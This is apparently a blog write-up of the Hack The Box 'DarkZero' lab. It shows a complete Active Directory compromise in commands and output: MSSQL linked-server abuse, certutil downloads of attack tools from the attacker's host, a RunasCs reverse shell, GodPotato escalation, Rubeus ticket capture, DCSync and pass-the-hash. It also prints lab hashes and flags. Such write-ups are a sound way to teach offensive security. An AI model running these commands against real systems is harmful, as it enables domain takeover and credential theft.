---
layout: post
title: "HTB - DarkZero"
categories: [writeup]
---

# Machine Info
As is common in real life pentests, you will start the DarkZero box with credentials for the following account `john.w / RFulUtONCOL!`
# Nmap Scan
### DC01.darkzero.htb
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-17 22:04:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info:
|   10.129.6.22:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-03-17T22:05:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-17T21:56:07
|_Not valid after:  2056-03-17T21:56:07
| ms-sql-ntlm-info:
|   10.129.6.22:1433:
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-03-17T22:04:58
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```
### DC02.darkzero.ext
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-17 22:53:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.ext, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC02.darkzero.ext
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC02.darkzero.ext
| Not valid before: 2025-07-29T14:22:49
|_Not valid after:  2026-07-29T14:22:49
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.ext, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC02.darkzero.ext
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC02.darkzero.ext
| Not valid before: 2025-07-29T14:22:49
|_Not valid after:  2026-07-29T14:22:49
|_ssl-date: TLS randomness does not represent time
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info:
|   172.16.20.2:1433:
|     Target_Name: darkzero-ext
|     NetBIOS_Domain_Name: darkzero-ext
|     NetBIOS_Computer_Name: DC02
|     DNS_Domain_Name: darkzero.ext
|     DNS_Computer_Name: DC02.darkzero.ext
|     DNS_Tree_Name: darkzero.ext
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-17T22:49:11
|_Not valid after:  2056-03-17T22:49:11
| ms-sql-info:
|   172.16.20.2:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-03-17T22:55:01+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.ext, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC02.darkzero.ext
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC02.darkzero.ext
| Not valid before: 2025-07-29T14:22:49
|_Not valid after:  2026-07-29T14:22:49
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.ext, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC02.darkzero.ext
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC02.darkzero.ext
| Not valid before: 2025-07-29T14:22:49
|_Not valid after:  2026-07-29T14:22:49
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC02; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-03-17T22:54:21
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC02, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:f2:5c:01 (Microsoft)
```
# Initial Enumeration
Authenticating to the MSSQL instance using the provided domain credentials via `impacket-mssqlclient`.
```
~/HTB/Windows/DarkZero $ mssqlclient.py inlanefreight.local/john.w:'RFulUtONCOL!'@DC01 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)>
```
Upon successful login, I proceeded to enumerate impersonation privileges, databases, and linked servers.
```
SQL (darkzero\john.w  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------

SQL (darkzero\john.w  guest@master)> enum_db
name     is_trustworthy_on
------   -----------------
master                   0
tempdb                   0
model                    0
msdb                     1

SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL
DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL
Linked Server       Local Login       Is Self Mapping   Remote Login
-----------------   ---------------   ---------------   ------------
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc
```
The results revealed a link to `DC02.darkzero.ext`, confirming we are within an `AD Forest`. Let's pivot to this linked server!
```
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)>
```
# Initial Foothold
Since `dc01_sql_svc` is `dbo`, we can enable `xp_cmdshell` to execute system commands and obtain an initial foothold on `DC02`. 
```
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
darkzero-ext\svc_sql
```
Initial enumeration reveals no immediate high-level privileges. However, a discovered policy backup indicates that `svc_sql` is granted `SeImpersonatePrivlege`. While this allows for `Potato`-style elevation, the privilege is currently unavailable because our `MSSQL` session is restricted to `Logon Type 3 (Network)`.
```
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami /priv
PRIVILEGES INFORMATION
----------------------
NULL
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell type C:\Policy_Backup.inf
<SNIP>
SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6
<SNIP>

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami /groups
Group Name                                 Type             SID                                                             Attributes
========================================== ================ =============================================================== ==================================================
<SNIP>
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
<SNIP>
```
To obtain fully functional interactive session, we need an alternative login method. First, let's establish a tunnel to `DC02` to further our investigation.
Upload the `Ligolo-ng` agent to `DC02` and initiate a connection back to the proxy on our attack machine.
```
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell certutil -urlcache -f http://10.10.15.12/agent.exe C:\Users\Public\agent.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

```
~/Ligolo-ng $ sudo ligolo-ng-proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
INFO[0000] Listening on 0.0.0.0:11601

ligolo-ng »
```

```
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell C:\Users\Public\agent.exe -connect 10.10.15.12:11601 -ignore-cert
```

```
ligolo-ng » INFO[0153] Agent joined.                                 id=00155df25c01 name="darkzero-ext\\svc_sql@DC02" remote="10.129.13.92:63277"
ligolo-ng » session
? Specify a session : 1 - darkzero-ext\svc_sql@DC02 - 10.129.13.92:63277 - 00155df25c01
[Agent : darkzero-ext\svc_sql@DC02] » start
INFO[0170] Starting tunnel to darkzero-ext\svc_sql@DC02 (00155df25c01)
[Agent : darkzero-ext\svc_sql@DC02] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet                       │
│ Hardware MAC │ 00:15:5d:f2:5c:01              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.20.2/24                 │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 1                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
```
Routing the target subnet through our tunnel interface. 
```
~/HTB/Windows/DarkZero $ sudo ip route add 172.16.20.0/24 dev ligolo
```
# Compromise darkzero.ext
To further enumerate `DC02`, we require a valid domain account. Since we currently have an `MSSQL` session as `svc_sql` and `ADCS` is active on target, we can leverage the `Pass-the-Certificate` technique to retrieve the `NT` hash for `svc_sql`.
Verified the `CA` details using `certutil`.
```
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell certutil -CA
  Name: Active Directory Enrollment Policy
  Id: {844CD2CE-3519-4A0D-AB8D-F20742C6DBEC}
  Url: ldap:
1 CAs:

  CA[0]:
  CAPropCommonName = darkzero-ext-DC02-CA
  CAPropDNSName = DC02.darkzero.ext
  CAPropCertificateTypes =
    0: DirectoryEmailReplication
    1: DomainControllerAuthentication
    2: KerberosAuthentication
    3: EFSRecovery
    4: EFS
    5: DomainController
    6: WebServer
    7: Machine
    8: User
    9: SubCA
    10: Administrator
<SNIP>
```
Uploaded `Certify.exe` to `DC02` and requested a certificate using the `User` template.
```
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell certutil -urlcache -f http://10.10.15.12/Certify.exe C:\Users\Public\Certify.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell certutil -urlcache -f http://10.10.15.12/Interop.CERTENROLLLib.dll C:\Users\Public\Interop.CERTENROLLLib.dll
****  Online  ****
CertUtil: -URLCache command completed successfully.

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell C:\Users\Public\Certify.exe request /ca:DC02\darkzero-ext-DC02-CA /template:User

[*] Action: Request a Certificates

[*] Current user context    : darkzero-ext\svc_sql
[*] No subject name specified, using current context as subject.

[*] Template                : User
[*] Subject                 : CN=svc_sql, CN=Users, DC=darkzero, DC=ext

[*] Certificate Authority   : DC02\darkzero-ext-DC02-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 4

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
<SNIP>
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
Converted the issued certificate (`.pem`) into a `.pfx` file on the attack machine.
```
~/HTB/Windows/DarkZero $ openssl pkcs12 -in svc_sql.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out svc_sql.pfx
Enter Export Password:
Verifying - Enter Export Password:
```
Authenticated using `Certipy` to obtain the `NT` hash for `svc_sql`.
```
~/HTB/Windows/DarkZero $ certipy auth -dc-ip 172.16.20.2 -pfx svc_sql.pfx
[*] Certificate identities:
[*]     SAN UPN: 'svc_sql@darkzero.ext'
[*]     Security Extension SID: 'S-1-5-21-1969715525-31638512-2552845157-1103'
[*] Using principal: 'svc_sql@darkzero.ext'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'svc_sql.ccache'
[*] Wrote credential cache to 'svc_sql.ccache'
[*] Trying to retrieve NT hash for 'svc_sql'
[*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f
```
Since `svc_sql` is not a member of the `Remote Management Users` group, we cannot gain a full interactive shell directly. We need cleartext credentials to trigger a `Logon Type 5 (Service)` session using `RunasCs`, which will grant us the necessary privileges.
Used `impacket-changepasswd` with the recovered `NT` hash to set the `svc_sql` password to `Password123`.
```
~/HTB/Windows/DarkZero $ changepasswd.py darkzero.ext/svc_sql@DC02 -hashes :816ccb849956b531db139346751db65f
New password:
Retype new password:
[*] Changing the password of darkzero.ext\svc_sql
[*] Connecting to DCE/RPC as darkzero.ext\svc_sql
[*] Password was changed successfully.
```
Uploaded `RunasCs.exe` to `DC02`.
```
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell certutil -urlcache -f http://10.10.15.12/RunasCs.exe C:\Users\Public\RunasCs.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
Started a listener on attack machine.
```
~/HTB/Windows/DarkZero $ rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
```
Executed `RunasCs` to bypass `UAC` and initiate a reverse shell.
```
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell C:\Users\Public\RunasCs.exe svc_sql Password123 cmd.exe -l 5 --bypass-uac -r 10.10.15.12:4444
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-29288$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1256 created in background.
```

```
Connection received on 10.129.13.92 63224
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
Leveraged `GodPotato` to abuse the impersonation privilege and add `svc_sql` to the local `Administrators` group.
```
C:\Users\Public>certutil -urlcache -f http://10.10.15.12/GodPotato-NET4.exe GodPotato-NET4.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\Public>.\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators svc_sql /add"
[*] CombaseModule: 0x140721803624448
[*] DispatchTable: 0x140721806211400
[*] UseProtseqFunction: 0x140721805506736
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\09c94ce0-9c1f-4a14-add9-7e8023d94f44\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000b002-0d4c-ffff-85a4-b4dc00702f52
[*] DCOM obj OXID: 0xa8e8501e39cf9476
[*] DCOM obj OID: 0xc74af2af401059ab
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 1012 Token:0x720  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 888
The command completed successfully.
```
Verified administrative access and retrieved the user flag.
```
~/HTB/Windows/DarkZero $ nxc smb DC02 -u svc_sql -p Password123 -x "type C:\Users\Administrator\Desktop\user.txt"
SMB         172.16.20.2     445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:darkzero.ext) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.2     445    DC02             [+] darkzero.ext\svc_sql:Password123 (Pwn3d!)
SMB         172.16.20.2     445    DC02             [+] Executed command via wmiexec
SMB         172.16.20.2     445    DC02             5b8a00d65a93b99d0bf39ce840c5190a
```
# Compromise darkzero.htb
Enumeration via `NetExec` confirmed that the `DC02$` computer account is `Trusted for Delegation (Unconstrained)`. This configuration allows us to intercept the `TGT` of any user who authenticates to `DC02`.
```
~/HTB/Windows/DarkZero $ nxc ldap DC02 -u svc_sql -p Password123 --trusted-for-delegation
LDAP        172.16.20.2     389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:darkzero.ext) (signing:None) (channel binding:Never)
LDAP        172.16.20.2     389    DC02             [+] darkzero.ext\svc_sql:Password123
LDAP        172.16.20.2     389    DC02             DC02$
```
Establish a `SYSTEM` shell on `DC02` using `impacket-psexec`.
```
~/HTB/Windows/DarkZero $ psexec.py darkzero.ext/svc_sql:Password123@DC02
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on DC02.....
[*] Found writable share ADMIN$
[*] Uploading file xVOBBgIK.exe
[*] Opening SVCManager on DC02.....
[*] Creating service uiIp on DC02.....
[*] Starting service uiIp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
Uploaded and launched `Rubeus.exe` in monitor mode with a 5-second interval.
```
C:\Users\Public> certutil -urlcache -f http://10.10.15.12/Rubeus.exe Rubeus.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\Public> .\Rubeus.exe monitor /interval:5 /nowrap
[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs
```
From the `DC01` `MSSQL` session, I executed `xp_dirtree` pointing to the `DC02` UNC path. This forced `DC01` to authenticate to `DC02`, catching its `TGT` in memory.
```
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\c$
subdirectory   depth   file
------------   -----   ----
```
`Rubeus` successfully intercepted the `Base64` encoded `TGT` for `DC01$`.
```
<SNIP>
[*] 4/3/2026 7:00:12 AM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  4/3/2026 6:49:55 AM
  EndTime               :  4/3/2026 4:48:35 PM
  RenewTill             :  4/10/2026 6:48:35 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

<SNIP>
```
Decoded ticket and converted the `.kirbi` file to `.ccache` using `impacket-ticketConverter`.
```
~/HTB/Windows/DarkZero $ echo "<SNIP>" | base64 -d > dc01.kirbi

~/HTB/Windows/DarkZero $ ticketConverter.py dc01.kirbi dc01.ccache
[*] converting kirbi to ccache...
[+] done
```
Exported the captured ticket to `KRB5CCNAME` environment variable and performed a `DCSync` against `DC01`.
```
~/HTB/Windows/DarkZero $ export KRB5CCNAME=dc01.ccache

~/HTB/Windows/DarkZero $ secretsdump.py DC01 -k -no-pass -just-dc-user Administrator
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
[*] Cleaning up...
```
Using the `Administrator`'s hash, I executed a `Pass-the-Hash` attack to retrieve the root flag.
```
~/HTB/Windows/DarkZero $ nxc smb DC01 -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726 -x "type C:\Users\Administrator\Desktop\root.txt"
SMB         10.129.13.92    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.13.92    445    DC01             [+] darkzero.htb\Administrator:5917507bdf2ef2c2b0a869a1cba40726 (Pwn3d!)
SMB         10.129.13.92    445    DC01             [+] Executed command via wmiexec
SMB         10.129.13.92    445    DC01             70bba28ca33281cc5acba9a856ebd8a6
```
